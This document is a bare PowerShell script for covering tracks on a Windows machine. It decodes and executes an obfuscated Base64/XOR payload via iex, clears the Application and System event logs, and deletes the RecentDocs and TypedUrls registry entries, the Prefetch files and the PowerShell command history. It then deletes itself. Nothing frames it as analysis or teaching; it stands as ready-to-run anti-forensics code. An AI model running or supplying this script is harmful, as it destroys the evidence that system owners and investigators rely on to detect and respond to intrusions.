$k='42';$s='JAB3AGUAdgB0AHUAdABpAGwAIABjAGwAIABTAEcA';$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($s));$x=[System.Text.Encoding]::UTF8.GetBytes($d);for($i=0;$i -lt $x.Length;$i++){$x[$i]=$x[$i]-bxor$k};iex ([System.Text.Encoding]::UTF8.GetString($x))
wevtutil cl Application
wevtutil cl System
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*' -ErrorAction SilentlyContinue
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedUrls' -Name '*' -ErrorAction SilentlyContinue
cmd /c del /f /q "C:\Windows\Prefetch\*" 2> $null
Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
$scriptPath = $MyInvocation.MyCommand.Definition
if (Test-Path $scriptPath) { cmd /c "timeout /t 2 /nobreak >nul & del `"$scriptPath`" /f /q" 2> $null }
